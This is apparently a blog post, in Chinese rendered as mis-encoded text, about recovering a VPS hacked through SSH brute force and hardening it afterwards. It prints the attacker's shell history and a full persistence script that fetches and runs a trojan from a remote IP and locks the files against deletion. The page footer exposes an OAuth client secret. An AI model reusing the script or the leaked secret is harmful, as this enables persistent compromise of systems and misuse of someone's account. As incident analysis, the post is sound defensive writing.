<p>äºæ˜¯å¼€å§‹åœ¨ç½‘ç»œä¸Šæœç´¢è¯¥æœ¨é©¬çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¸€ç•ªå°è¯•ä¹‹åï¼Œè¿˜æ˜¯æ²¡èƒ½æ‰¾åˆ°å…³äºè¿™ä¸ªæœ¨é©¬çš„è¯¦ç»†ä¿¡æ¯ï¼Œâ€œé‚£å°±å…ˆæ”¾ç€ï¼Œå…ˆæªå‡ºå…¶ä»–æœ¨é©¬å†è¯´â€ã€‚</p>
<p>å…¨åŸæœæŸ¥<br>æ­¤æ—¶çš„æˆ‘æœ‰ç‚¹æ…Œä¹±å’Œæ— å¤´ç»ªï¼Œâ€œå¯¹ç—…æ¯’ä¸€ç‚¹éƒ½ä¸äº†è§£å‘¢â€ï¼Œâ€œä¸è¿‡ï¼Œè¿™ç‚¹é—®é¢˜å¯éš¾ä¸å€’æˆ‘ï¼Œç§»æ­¥googleï¼â€</p>
<p>ç»è¿‡ä¸€ç•ªæŸ¥æ‰¾ä¹‹åï¼Œå‘ç°äº† clamAV è¿™ä¸ªå·¥å…·ï¼Œä¸€ä¸ªå¾ˆpopularçš„å¼€æºç—…æ¯’å¼•æ“ï¼Œèƒ½å¤Ÿæ‰«ææ£€æµ‹æœ¨é©¬ã€ç—…æ¯’å’Œæ¶æ„ç¨‹åºï¼Œæ­£ä¹ƒæˆ‘æ‰€éœ€å•Šï¼ï¼</p>
<p>é©¬ä¸Šç”¨ clamAV ç¥å™¨æ‰«æå…¨ç«™æ–‡ä»¶ï¼Œæœç„¶è¿˜å‘ç°äº†ä¸å°‘å…¶ä»–çš„æœ¨é©¬ï¼š</p>
<p>/usr/bin/icnanker<br>/usr/bin/.filebak<br>/usr/bin/.sshd<br>/usr/bin/lsof<br>/usr/bin/bsd-port/getty<br>/bin/ps<br>/bin/netstat<br>/bin/ss<br>Oh, noï¼ï¼ï¼</p>
<p>ps, netstat, ss, lsof è¿™äº›å¾ˆå¸¸ç”¨çš„ç›‘æ§æœåŠ¡å™¨çŠ¶æ€çš„ç³»ç»Ÿå·¥å…·å…¨éƒ¨è¢«æ‰åŒ…äº†ï¼</p>
<p>â€œçœŸæ˜¯å±é™©ï¼Œè¦æ˜¯æ²¡æœ‰åœ¨å…¨æœºè¿›è¡Œç—…æ¯’æœç´¢çš„è¯ï¼Œå¾ˆå®¹æ˜“å°±ä¼šåˆè¢«è«åå…¶å¦™çš„æ„ŸæŸ“äº†ï¼â€ï¼Œå¿ƒé‡Œç›´å†’å†·æ±—ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘çš„è¡¨æƒ…æ˜¯è¿™æ ·çš„ï¼š</p>
<img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/3.jpg">
<p>å—¯ï¼Œå¿ƒæƒ…éå¸¸æ²‰é‡ã€‚éå¸¸æ²‰é‡ã€‚éå¸¸éå¸¸çš„æ²‰é‡ã€‚</p>
<p>æ€€ç€æ²‰é‡çš„å¿ƒæƒ…ï¼Œå¼€å§‹å‡ºå…¶æ„æ–™çš„å†·é™æ€è€ƒï¼Œå¾—å‡ºä»¥ä¸‹æ¨æ–­ï¼ˆäº‹å®ï¼‰ï¼š</p>
<p>æ”»å‡»è€…åˆ©ç”¨æš´ç ´ç™»å½•æœåŠ¡å™¨ï¼Œ1æœˆ26å·æˆåŠŸçªç ´ï¼Œ1æœˆ28å·ç§ä¸‹æœ¨é©¬ï¼Œ29å·å¼€å§‹è¿›è¡Œtcp syn flood,floodæŒç»­ä¸€æ®µæ—¶é—´åï¼Œè¢«DOæ£€æµ‹åˆ°ï¼Œå°äº†æˆ‘çš„ä¸»æœºã€‚<br>æ”»å‡»è€…æ²¡æœ‰æ¸…é™¤æ—¥å¿—ï¼Œæ²¡æœ‰åšå¯¹æœºå™¨æœ‰æå¤§ç ´åæ€§çš„äº‹æƒ…ã€‚<br>æ”»å‡»è€…ä¸ä»…ä»…æ˜¯ç§ä¸‹â€icnankerâ€è¿™ä¸€ä¸ªæ˜¾è€Œæ˜“è§çš„æœ¨é©¬ï¼Œè¿˜ç”¨ä¸€äº›å…¶ä»–çš„æœ¨é©¬æ‰åŒ…äº†æœ¬æœºä¸Šçš„å…³é”®ç¨‹åºã€‚<br>é‚£ä¹ˆï¼Œæˆ‘éœ€è¦åæŠ—äº†ã€‚</p>
<p>æ€æ‰æœ¨é©¬è¿›ç¨‹</p>
<h1 id="kill-13648-æ€æ‰apache2-sh"><a href="#kill-13648-æ€æ‰apache2-sh" class="headerlink" title="kill 13648  # æ€æ‰apache2.sh"></a>kill 13648  # æ€æ‰apache2.sh</h1><h1 id="kill-14519-æ€æ‰â€icnankerâ€"><a href="#kill-14519-æ€æ‰â€icnankerâ€" class="headerlink" title="kill 14519  # æ€æ‰â€icnankerâ€"></a>kill 14519  # æ€æ‰â€icnankerâ€</h1><h1 id="kill-26595-æ€æ‰-sshd"><a href="#kill-26595-æ€æ‰-sshd" class="headerlink" title="kill 26595  # æ€æ‰.sshd"></a>kill 26595  # æ€æ‰.sshd</h1><p>æ¸…é™¤æœ¨é©¬</p>
<p>å†æ¬¡æŸ¥çœ‹å‘½ä»¤è®°å½•å’Œapache2.shï¼Œç¡®å®šæ¸…é™¤æœ¨é©¬çš„æ­¥éª¤ï¼š</p>
<h1 id="history-1"><a href="#history-1" class="headerlink" title="history"></a>history</h1><p>(â€¦)<br>    4  cp /usr/bin/wget /usr/bin/vget<br>    5  cp /usr/bin/chattr /usr/bin/lockr<br>    6  chmod 0 /usr/bin/chattr;chmod 0 /usr/bin/wget<br>    7  lockr +i /usr/bin/chattr;lockr +i /usr/bin/wget<br>    8  chmod 0755 /usr/bin/vget;chmod 0755 /usr/bin/lockr<br>    9  vget <a href="http://183.60.149.202:8080/apache2.sh" target="_blank" rel="noopener">http://183.60.149.202:8080/apache2.sh</a><br>    10  mv /root/apache2.sh /etc/init.d/apache2.sh<br>    11  chmod 0755 /etc/init.d/apache2.sh<br>    12  nohup sh /etc/init.d/apache2.sh &gt;/dev/null 2&gt;&amp;1 &amp;<br>    13  lockr +i /etc/init.d/apache2.sh<br>    14  vi /etc/rc.local<br>    15  lockr +i /etc/rc.local<br>    16  less /etc/init.d/apache2.sh</p>
<h1 id="cat-etc-init-d-apache2-sh-1"><a href="#cat-etc-init-d-apache2-sh-1" class="headerlink" title="cat /etc/init.d/apache2.sh"></a>cat /etc/init.d/apache2.sh</h1><p>#!/bin/sh<br>while [ 1 -gt 0 ];do<br>Get=â€/usr/bin/vgetâ€<br>Lok=â€/usr/bin/lockrâ€<br>Bak=â€/usr/bin/.filebakâ€<br>hosts=â€/etc/hosts.bakâ€<br>File=â€/usr/bin/icnankerâ€<br>if [ ! -f  â€œ$hostsâ€ ];then<br>    cp -f /etc/hosts.deny /etc/hosts.bak<br>    lockr +i /etc/hosts.bak<br>fi<br>if [ ! -f  â€œ$Lokâ€ ];then<br>    cp -f /usr/bin/chattr /usr/bin/lockr<br>    cp -f /usr/bin/chattr /usr/bin/.locks<br>    cp -f /usr/bin/.locks /usr/bin/lockr<br>    chmod 0755 /usr/bin/lockr<br>    chmod 0755 /usr/bin/.locks<br>    lockr +i /usr/bin/lockr<br>    lockr +i /usr/bin/.locks<br>fi<br>if [ ! -f  â€œ$Getâ€ ];then<br>    cp -f /usr/bin/wget /usr/bin/vget<br>    cp -f /usr/bin/wget /usr/bin/.bget<br>    cp -f /usr/bin/.bget /usr/bin/vget<br>    chmod 0755 /usr/bin/vget<br>    chmod 0755 /usr/bin/.bget<br>    lockr +i /usr/bin/vget<br>    lockr +i /usr/bin/.bget<br>fi<br>Exist=<code>ss|grep 183.60.149.202:43200|grep -v &quot;grep&quot;</code><br>if [ -z â€œ$Existâ€ ];then<br>    lockr -i /usr/bin/.filebak<br>    lockr -i /usr/bin/icnanker<br>    chmod 0755 /usr/bin/.filebak<br>    chmod 0755 /usr/bin/icnanker<br>    if [ ! -f  â€œ$Fileâ€ ];then<br>        if [ ! -f  â€œ$Bakâ€ ];then<br>            rm -f /etc/init.d/icnanker;rm -f /etc/init.d/icnanker.1<br>            vget -P /etc/init.d/ vget <a href="http://183.60.149.202:8080/icnanker" target="_blank" rel="noopener">http://183.60.149.202:8080/icnanker</a><br>            mv /etc/init.d/icnanker /usr/bin/icnanker<br>        else<br>            cp -f /usr/bin/.filebak /usr/bin/icnanker<br>        fi<br>    fi<br>    pkill icnanker;pkill icnanker<br>    chmod 0755 /usr/bin/icnanker<br>    lockr +i /usr/bin/icnanker<br>    /usr/bin/icnanker<br>fi<br>if [ ! -f  â€œ$Bakâ€ ];then<br>    cp -f /usr/bin/icnanker /usr/bin/.filebak<br>    chmod 0755 /usr/bin/.filebak<br>    lockr +i /usr/bin/.filebak<br>fi<br>chmod 0 /usr/bin/wget<br>lockr +i /usr/bin/wget<br>chmod 0 /usr/bin/chattr<br>lockr +i /usr/bin/chattr<br>chmod 0 /usr/lib/sftp-server<br>lockr +i /usr/lib/sftp-server<br>lockr -i /etc/hosts.deny;cp /etc/hosts.bak /etc/hosts.deny;lockr +i /etc/hosts.deny<br>sleep 30<br>done<br>å“¼ï¼Œâ•­(â•¯^â•°)â•®ï¼Œå±…ç„¶æ•¢è¿™æ ·ç©æˆ‘ã€‚è¿™å‡ è¡Œå‘½ä»¤å’Œè„šæœ¬è¯•å›¾å¹²æ‰°æˆ‘æŠŠç—…æ¯’ä»æœºå™¨ä¸Šåˆ é™¤å“ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼Œ å°†/usr/bin/chattrå¤åˆ¶åˆ°/usr/bin/lockr</p>
<p>cp /usr/bin/chattr /usr/bin/lockr</p>
<p>ç¬¬äºŒæ­¥ï¼Œ å°†chattrå˜ä¸ºä¸å¯è¯»ä¸å¯å†™ä¸å¯æ‰§è¡Œçš„æƒé™</p>
<p>chmod 0 /usr/bin/chattr</p>
<p>ç¬¬ä¸‰æ­¥ï¼Œ é”ä½chattrï¼Œè®©å…¶å˜ä¸ºä¸å¯ä¿®æ”¹</p>
<p>lockr +i /usr/bin/chattr</p>
<p>ç¬¬å››æ­¥ï¼Œ é”ä½æ‰€æœ‰å…¶ä»–æœ¨é©¬ï¼Œè®©å…¶ä¸å¯åˆ é™¤ï¼Œå¦‚icnankerç­‰ã€‚</p>
<p>lockr +i /usr/bin/icnanker</p>
<p>ç¬¬äº”æ­¥ï¼Œ å°†æœ¨é©¬ç¨‹åºåŠ å…¥ç³»ç»Ÿå¼€æœºè‡ªå¯è„šæœ¬ï¼ˆ /etc/rc.local ï¼‰ä¸­ï¼Œæ¯æ¬¡å¼€æœºè‡ªåŠ¨è¿è¡Œæœ¨é©¬ã€‚</p>
<p>è¿™æ ·ä¸€æ¥ï¼Œ å¦‚æœä¸æ‡‚è¿™æ®µé€»è¾‘çš„è¯ï¼Œ è¦åˆ é™¤ç—…æ¯’å¦‚icnankeréƒ½ä¼šè¢«è«åå…¶å¦™è¢«æ‹’ç»äº†ï¼š</p>
<h1 id="rm-usr-bin-icnanker"><a href="#rm-usr-bin-icnanker" class="headerlink" title="rm /usr/bin/icnanker"></a>rm /usr/bin/icnanker</h1><p>rm: cannot remove â€˜icnankerâ€™: Operation not permitted<br>å¹¸å¥½ï¼Œ æˆ‘è¿™ä¸ªäººæœ‰éå¸¸å¯æ€•çš„è€å¿ƒã€‚é©¬ä¸Šå»æŸ¥äº†chattræ˜¯å¹²ä»€ä¹ˆçš„ã€‚åŸæ¥ï¼Œlinuxçš„æ–‡ä»¶è¿˜èƒ½è®¾ç½®ä¸€äº›é™„å¸¦çš„å±æ€§ã€‚æ¯”å¦‚æœ‰ä¸€ä¸ªå±æ€§â€™iâ€™ï¼Œå®ƒçš„æ„æ€å°±æ˜¯â€immutableâ€ï¼Œå³é™åˆ¶æ–‡ä»¶ä¸å¯æ›´æ”¹ï¼ˆåˆ é™¤ã€ä¿®æ”¹æ–‡ä»¶å†…å®¹ã€æ”¹å˜æ–‡ä»¶æƒé™ç­‰ï¼‰ã€‚é‚£ä¹ˆé€šè¿‡lockr +i /usr/bin/icnankerï¼Œç»™icnankeré™„ä¸Šäº†â€™iâ€™å±æ€§ä¹‹åï¼Œå°±è®©æˆ‘æ²¡åŠæ³•åˆ é™¤icnankeräº†ï¼</p>
<p>â€œé‚£æŠŠicnankerçš„â€™iâ€™å±æ€§å»é™¤å‘—â€ï¼Œ è¿™æ˜¯ä¸€ä¸ªå¾ˆç›´æ¥çš„æƒ³æ³•ã€‚ä½†æ˜¯è¿™è´§ä¸ºäº†é˜²æ­¢æˆ‘è¿™ä¹ˆåšï¼Œè¿˜è®°å¾—å—ï¼Œå®ƒæŠŠ chattr è¿™ä¸ªå·¥å…·é€šè¿‡ chmod 0 /usr/bin/chattrå‘½ä»¤å°†chattrçš„æ‰§è¡Œæƒé™å»é™¤äº†ã€‚æ¢è¨€ä¹‹ï¼Œæˆ‘æ²¡æ³•è¿è¡Œchattræ¥å»é™¤icnankerçš„â€™iâ€™å±æ€§ï¼</p>
<p>é‚£æ˜¯ä¸æ˜¯å°±æ²¡åŠæ³•åˆ é™¤è¿™äº›æœ¨é©¬äº†å‘¢ï¼Ÿ</p>
<p>NOï¼ŒNOï¼ŒNOã€‚å°†è®¡å°±è®¡å°±å¥½äº†ã€‚</p>
<p>è¿˜è®°å¾—å—ï¼Œ ä¸Šé¢é‚£æ®µè„šæœ¬ï¼ŒæŠŠ/usr/bin/chattrå¤åˆ¶åˆ°äº†/usr/bin/lockrã€‚é‚£æˆ‘ç›´æ¥ä½¿ç”¨lockræŠŠchattrè§£é”ä¸å°±è¡Œäº†ï¼Ÿ</p>
<h1 id="lockr-i-usr-bin-chattr"><a href="#lockr-i-usr-bin-chattr" class="headerlink" title="lockr -i /usr/bin/chattr"></a>lockr -i /usr/bin/chattr</h1><h1 id="chmod-755-usr-bin-chattr"><a href="#chmod-755-usr-bin-chattr" class="headerlink" title="chmod 755 /usr/bin/chattr"></a>chmod 755 /usr/bin/chattr</h1><h1 id="chattr-i-usr-bin-icnanker"><a href="#chattr-i-usr-bin-icnanker" class="headerlink" title="chattr -i /usr/bin/icnanker"></a>chattr -i /usr/bin/icnanker</h1><h1 id="rm-usr-bin-icnanker-1"><a href="#rm-usr-bin-icnanker-1" class="headerlink" title="rm /usr/bin/icnanker"></a>rm /usr/bin/icnanker</h1><p>(â€¦)<br>å‘µå‘µï¼Œè¿™æ ·ï¼Œå°±æŠŠæ”»å‡»è€…è®¾ä¸‹çš„åœˆå¥—ä¸€ä¸‹å°±è§£å¼€äº†ã€‚åšåˆ°è¿™é‡Œæˆ‘è§‰å¾—æ”»å‡»è€…çš„æ™ºå•†å…¶å®å€¼å¾—å•†æ¦·çš„ã€‚æˆ‘åœ¨æ™ºå•†ä¸Šï¼Œå…¶å®åº”è¯¥æ›´é«˜ä¸€ç­¹ã€‚å°å°çš„è‡ªå¨±è‡ªä¹äº†ä¸€æŠŠã€‚ã€‚ã€‚</p>
<p>æœ¨é©¬ï¼Œå°±è¿™æ ·ä¸€æ­¥ä¸€æ­¥çš„å…¨éƒ¨è¢«æˆ‘æœé›†èµ·æ¥ï¼Œè¿‡äº›æ—¶å€™å‡†å¤‡ä¸€æŠŠç«çƒ§äº†å®ƒã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæ˜¯æ€è€ƒå¯¹ç­–çš„æ—¶å€™äº†ã€‚è¿™æ¬¡æš´ç ´è¡¨é¢ä¸Šå…¨æ˜¯å¼±å£ä»¤æƒ¹çš„ç¥¸ï¼Œå…¶å®è¿˜æ˜¯å› ä¸ºå¤ªæ‡’ï¼Œæ˜æ˜çŸ¥é“å¾ˆå±é™©ï¼Œå´å­˜åœ¨ä¾¥å¹¸å¿ƒç†ã€‚â€œå—¯ï¼Œè¿™æ¬¡ä¸€å®šè¦é‡‡å–å…¨é¢çš„å®‰å…¨ç­–ç•¥ï¼â€</p>
<p>è¿›è¡Œä¸€äº›ç ”ç©¶ä¹‹åï¼Œå‡†å¤‡ä»ä¸¤ä¸ªå¤§æ–¹å‘å…¥æ‰‹ï¼Œé˜²æŠ¤æœºåˆ¶å’Œæ£€æµ‹æœºåˆ¶ã€‚ä¸€ä¸ªæ˜¯åŠ å¼ºå®‰å…¨æ€§ï¼Œå¢åŠ ä»–ä»¬ï¼ˆhackerï¼‰è¿›æ”»éš¾åº¦ã€‚å¦ä¸€ä¸ªæ˜¯åŠ å¼ºè­¦æˆ’ï¼Œä¸€æ—¦å‘ç°æœ‰äººå…¥ä¾µï¼Œèƒ½ç«‹é©¬çŸ¥é“å¹¶ä¸”å¿«é€Ÿå“åº”ã€‚</p>
<p>å»ºç«‹åŸå¢™<br>ï¼ˆSSHï¼‰ç™»å½•å®‰å…¨ç­–ç•¥</p>
<ul>
<li><strong>ä½¿ç”¨å¼ºå¯†ç ï¼ï¼</strong>ç»å¤§å¤šæ•°æš´ç ´éƒ½æ˜¯å› ä¸ºè¯¥æ­»çš„å¼±å£ä»¤ï¼</li>
<li><strong>è®¾ç½®sshä¸å…è®¸rootç™»å½•ï¼</strong>å› ä¸ºå¤§å¤šæ•°ç™»å½•æš´ç ´éƒ½æ˜¯å¯¹äºrootç”¨æˆ·è¿›è¡Œæš´ç ´çš„ï¼</li>
<li><strong>ä¸è¦æ³„éœ²ä¸»æœºç”¨æˆ·åç­‰ä¿¡æ¯ï¼ï¼</strong>è¿™ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢é’ˆå¯¹æ€§æš´ç ´ï¼Œå¦‚æœåˆ«äººçŸ¥é“ä½ çš„ç”¨æˆ·åï¼Œåˆå¯¹ä½ æœ‰ä¸€äº›äº†è§£çš„è¯ï¼Œå…¶çŒœä¸­ä½ å¯†ç çš„æ¦‚ç‡ä¼šå¤§å¤§åŠ å¤§ã€‚</li>
<li><strong>æ£€æŸ¥æš´ç ´IPå¹¶ä¸”å°ç¦ä¹‹ï¼</strong>æœ‰ä¸ªéå¸¸å¥½ç”¨çš„å·¥å…·ï¼Œå…¶å¤§åä¸ºâ€œfail2banâ€ï¼Œå®ƒå¯ä»¥æ‰«æä¸»æœºçš„ç™»å½•æ—¥å¿—ï¼Œå¹¶ä¸”é™åˆ¶å•IPå¤±è´¥ç™»å½•æ¬¡æ•°ï¼Œå¦‚æœè¶…è¿‡é™åˆ¶ï¼Œå°±ä¼šå°ç¦è¯¥IPã€‚<br>é˜²ç«å¢™</li>
</ul>
<p>é˜²ç«å¢™çš„ä½œç”¨ä¸»è¦æ˜¯å¯¹å¤–å…³é—­ä¸å¿…è¦çš„ç½‘ç»œæœåŠ¡ï¼Œå‡å°‘ç”±å¸¸è§„ç¨‹åºæœ¬èº«çš„æ¼æ´è€Œå¸¦æ¥çš„éšæ‚£ã€‚åŒæ ·ï¼Œæœ‰ä¸€ä¸ªéå¸¸å¥½ç”¨çš„å·¥å…·ï¼Œâ€œufwâ€ï¼Œå¯ä»¥éå¸¸æ–¹ä¾¿çš„è®¾ç½®é˜²ç«å¢™ï¼š</p>
<h1 id="ufw-allow-80-tcp"><a href="#ufw-allow-80-tcp" class="headerlink" title="ufw allow 80/tcp"></a>ufw allow 80/tcp</h1><h1 id="ufw-allow-ssh"><a href="#ufw-allow-ssh" class="headerlink" title="ufw allow ssh"></a>ufw allow ssh</h1><p>åªå¼€å¯ä¸¤ä¸ªæœåŠ¡ï¼Œweb serviceå’Œssh serviceã€‚</p>
<p>è¿˜æœ‰ä¸€äº›å»ºè®®</p>
<p>äº‹å®ä¸Šï¼Œæ”»å‡»æˆ‘æœçš„æ–¹å¼å¤ªå¤šäº†ï¼Œæš´åŠ›ç ´è§£å¯†ç ç™»å½•åªæ˜¯å…¶ä¸­ä¸€ç§ï¼Œè¿˜æœ‰å¾ˆå¤šæ˜¯åˆ©ç”¨è½¯ä»¶æ¼æ´è¿›è¡Œçš„ï¼Œè¿˜è®°å¾—ä¸Šä¸€å¹´ä¸€è¿ä¸²ä»¤äººå‘æŒ‡çš„æ¼æ´å—ï¼šHeartBleed, Shellshockï¼ï¼ä¸ºäº†ç‰¢è®°è¿™äº›æƒ¨ç—›çš„æ•™è®­ï¼ˆåˆ«äººèº«ä¸Šçš„ï¼‰ï¼Œè°¨è®°ï¼š</p>
<ul>
<li><strong>å…³æ³¨å®‰å…¨åŠ¨æ€ï¼Œå³æ—¶æ›´æ–°è½¯ä»¶å®‰å…¨è¡¥ä¸ï¼</strong></li>
<li><strong>é™åˆ¶æœåŠ¡ï¼Œåªè®©è¯¥è¿è¡Œçš„æœåŠ¡è¿è¡Œï¼</strong></li>
<li><strong>åœ¨å®‰è£…éå®˜æ–¹åŒ…çš„æ—¶å€™ï¼Œæé«˜è­¦æƒ•ï¼Œå°å¿ƒè¢«æ‰åŒ…!</strong><br>å…¨åŸè­¦æˆ’<br>å»ºå¥½åŸå¢™ï¼Œå°±è¯¥éƒ¨ç½²å“¨å…µäº†ã€‚</li>
</ul>
<p>é‚£ä¹ˆè¯¥å¦‚ä½•ç›‘æµ‹æœåŠ¡å™¨çš„å¥åº·çŠ¶æ€å‘¢ï¼Ÿ</p>
<p>åœ¨linuxä¸‹è¿˜æ˜¯æœ‰ä¸€äº›å·¥å…·å¯ä»¥ä½¿ç”¨çš„ï¼Œç»è¿‡ä¸€ç•ªå¯¹æ¯”ï¼Œæˆ‘æœ€ç»ˆé€‰æ‹©äº†tripwireã€‚å¥¹å¯ä»¥æ£€æµ‹linuxå…³é”®æ–‡ä»¶çš„å˜åŒ–æƒ…å†µ,æ¯”å¦‚/usr/binç›®å½•ä¸‹é¢çš„æ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘é…ç½®äº†ä¸€ä¸ªcrontabï¼Œæ¯å¤©æ—©ä¸Š3ç‚¹æ£€æŸ¥ä¸€éç³»ç»Ÿå…³é”®æ–‡ä»¶ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰é—®é¢˜ï¼Œå¹¶ä¸”é‚®ä»¶æŠ¥å‘Šç»™æˆ‘ã€‚</p>
<p>é‚®ä»¶crontabé…ç½®ï¼š</p>
<p>30 14 <em> </em> * /usr/sbin/tripwire â€“check | mail -s â€œTripwire report for <code>uname -n</code>â€œ <a href="mailto:monklof@gmail.com" target="_blank" rel="noopener">monklof@gmail.com</a> -r report.tripwire<br>è¿™æ ·ï¼Œæ¯å¤©æˆ‘éƒ½å¯ä»¥é€šè¿‡æ–‡ä»¶æŸ¥çœ‹ç³»ç»Ÿæ˜¯å¦è¢«ç ´åäº†ã€‚</p>
<p>æ±²å–è¿™æ¬¡æ•™è®­ï¼Œä¸ºäº†èƒ½æ¯å¤©æ£€æµ‹ç”¨æˆ·ç™»å½•å’Œæƒ…å†µï¼Œæˆ‘ç‰¹æ„å†™äº†ä¸€ä¸ªè„šæœ¬æ¥æ£€æŸ¥æ˜¨å¤©ç³»ç»Ÿçš„ç™»å½•æƒ…å†µï¼š</p>
<p>login_review.sh:</p>
<p>#! /usr/bin/env bash</p>
<h1 id="monitor-yesterdayâ€™s-login-via-ssh-and-send-report-email"><a href="#monitor-yesterdayâ€™s-login-via-ssh-and-send-report-email" class="headerlink" title="monitor yesterdayâ€™s login via ssh, and send report email"></a>monitor yesterdayâ€™s login via ssh, and send report email</h1><p>date=<code>date -d &quot;yesterday&quot; +&quot;%b %e&quot;</code><br>yesterday_acceptedlog=<code>grep &quot;${date}.*sshd.*Accepted&quot; /var/log/auth.log | grep -v &quot;sudo&quot;</code><br>fail=<code>grep &quot;${date}.*sshd.*Failed&quot; /var/log/auth.log | grep -v &quot;sudo&quot; | wc -l</code></p>
<p>success=<code>printf &quot;%s&quot; &quot;$yesterday_acceptedlog&quot; |wc -l</code></p>
<p>warn=â€â€<br>if [ $success -gt 0 ]<br>then<br>warn=â€[WARN] â€œ<br>fi</p>
<p>html=â€&lt;!doctype html&gt;</p>
<p><html><br>  <head><title>${warn}SSH Login Reports for <code>uname -n</code> at $date </title></head><br>  <body><br>    <div class="\"result\""><br>     <strong>Success logins:</strong> $success <br><br>     <table border="\"1\"" style="\"border-collapse:" collapse;\"=""><br>       <tr><br>         <th>Time</th><br>         <th>User</th><br>         <th>Login Method</th><br>       </tr><br><code>echo $yesterday_acceptedlog | awk &#39;{if(length !=0)printf \&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s (%s:%s)&lt;/td&gt;&lt;/tr&gt;\n\&quot;,$3,$9,$7,$11,$13}&#39;</code><br>     </table></div></body></html></p>
<pre><code> &lt;strong&gt;Failed Trys: &lt;/strong&gt; $fail &lt;br /&gt;
&lt;/div&gt;
</code></pre><p>  <br>â€œ</p>
<p>case $1 in<br>-d | â€“debug)<br>    printf â€œSuccess logs: %d\n%s\nRendered Html:\n%sâ€ $success â€œ$yesterday_acceptedlogâ€ â€œ$htmlâ€<br>    ;;<br>*)<br>    echo $html | mail -s â€œ${warn}SSH Login Report for <code>uname -n</code> at $dateâ€ <a href="mailto:monklof@gmail.com" target="_blank" rel="noopener">monklof@gmail.com</a> -r report.login_review -a â€œContent-type: text/htmlâ€<br>    ;;<br>esac<br>ç„¶åä¹Ÿé…ç½®ä¸€ä¸ªcrontabï¼Œæ¯å¤©éƒ½æ£€æµ‹:</p>
<p>25 14 <em> </em> * /usr/local/bin/login_review.sh<br>è¿™æ ·ï¼Œæˆ‘æ¯å¤©å°±èƒ½æ”¶åˆ°è¿™æ ·çš„ä¸¤ä»½æŠ¥è¡¨äº†ï¼š</p>
<img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/4.png">
<img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/5.png">
<img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/6.png">
<p>â•®(â•¯â–½â•°)â•­</p>
<p>åšå®¢åœäº†å°†è¿‘ä¸€ä¸ªæ˜ŸæœŸä¹‹åï¼Œåšå¥½äº†åŸºæœ¬çš„é˜²æŠ¤ï¼Œå°å¿ƒç¿¼ç¿¼çš„å°†æœåŠ¡å™¨å†æ¬¡å¼€å¯ã€‚ï¼ˆä»¥ä¸Šçš„å®‰å…¨ç­–ç•¥çš„å®æ–½ä¹Ÿæ˜¯åœ¨æœåŠ¡å¼€å¯ä¹‹åä¸€ç›´åœ¨è¿›è¡Œçš„ï¼‰</p>
<p>æœåŠ¡å™¨é‡æ–°å¼€å¯çš„é‚£å¤©ï¼Œé€šè¿‡DOçš„è¿ç»´ç•Œé¢æŸ¥çœ‹è¢«æ”»å‡»çš„é‚£å¤©çš„æµé‡æƒ…å†µï¼š</p>
<p>å¯ä»¥çœ‹åˆ°29å·é‚£å¤©tcp syn floodæµé‡è¾¾åˆ°äº†140Mbpsï¼å¿ƒæœ‰ä½™æ‚¸å•Šå¿ƒæœ‰ä½™æ‚¸ã€‚</p>
<p>ç„¶åæ¥ä¸‹æ¥çš„å‡ å¤©ï¼Œæ¯å¤©éƒ½çœ‹fail2banæŸ¥çœ‹è¢«å°ç¦çš„ipã€çœ‹æŠ¥è¡¨æŸ¥çœ‹ç³»ç»Ÿå¥åº·çŠ¶å†µã€‚æ•ˆæœæ˜¾è‘—ï¼Œæ¯å¤©çš„æš´ç ´å¤±è´¥å°è¯•é‡ä»ä¸Šä¸‡æˆåŠŸé™ä½åˆ°500ä»¥å†…ã€‚å¹¶ä¸”è‡³ä»Šæœªå‡ºç°è¿‡é—®é¢˜ã€‚</p>
<p>Cheersï¼è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘çš„è¡¨æƒ…æ˜¯è¿™æ ·çš„ï¼š</p>
<img src="/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/7.jpg">
      
    </div>
    <footer class="article-footer">
      

      
        
	  <!-- Gitment START! Deploy by Z4HD -->
	<div id="comments"></div>
		<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
		<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
		<script>
		var gitment = new Gitment({
			id: 'http://yoursite.com/2018/03/30/æœåŠ¡å™¨è¢«é»‘ä¹‹åçš„å¿ƒè·¯å†ç¨‹/',
			owner: 'JoeJoeyMa',
 			repo: 'JoeJoeyMa.github.io',
			oauth: {
				client_id: 'b16fd2b48371378f485f',
				client_secret: 'a3d12c33716206b031ba0d95fade9927e31dbb46',
			},
		})
		gitment.render('comments')
		</script>
		<!-- Gitment è‡ªå®šä¹‰æ ·å¼è¡¨ -->
		<link rel="stylesheet" href="/css/comment-gitment.css">
		<!-- Gitment END! -->
	 

      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/VPS/">VPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/firewalld/">firewalld</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/çˆ†ç ´ç«¯å£/">çˆ†ç ´ç«¯å£</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/è„šæœ¬å°å­/">è„šæœ¬å°å­</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/è¿è¥/">è¿è¥</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/04/24/å¿«é€Ÿç ´è§£å„ç§æ•£åˆ—hash [ hashcatå…¥é—¨ç¯‡ ]/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Nuevo</strong>
      <div class="article-nav-title">
        
